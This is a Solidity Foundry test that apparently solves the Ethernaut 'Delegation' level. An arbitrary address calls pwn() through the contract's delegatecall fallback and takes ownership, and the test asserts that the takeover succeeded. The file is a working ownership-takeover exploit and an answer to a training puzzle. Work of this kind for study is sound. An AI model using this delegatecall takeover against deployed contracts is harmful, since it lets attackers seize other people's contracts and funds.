// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Delegate.sol";
import "../src/Delegation.sol";

contract CounterTest is Test {
    Delegate public delegate;
    Delegation public delegation;

    function setUp() public {
        delegate = new Delegate(vm.addr(2));
        delegation = new Delegation(address(delegate));
    }

    function test_ClaimOwnershipDelegation() public {
        assertEq(
            addressToUint256(address(this)),
            addressToUint256(delegation.owner())
        );
        assertEq(
            addressToUint256(vm.addr(2)),
            addressToUint256(delegate.owner())
        );
        address someRandomUser = vm.addr(1);
        vm.prank(someRandomUser);
        (bool status, ) = address(delegation).call(
            abi.encodeWithSignature("pwn()")
        );
        assertEq(status == true ? 1 : 0, 1);
        assertEq(
            addressToUint256(someRandomUser),
            addressToUint256(delegation.owner())
        );
    }

    function addressToUint256(address _adr) internal pure returns (uint256) {
        return uint256(uint160(_adr));
    }
}
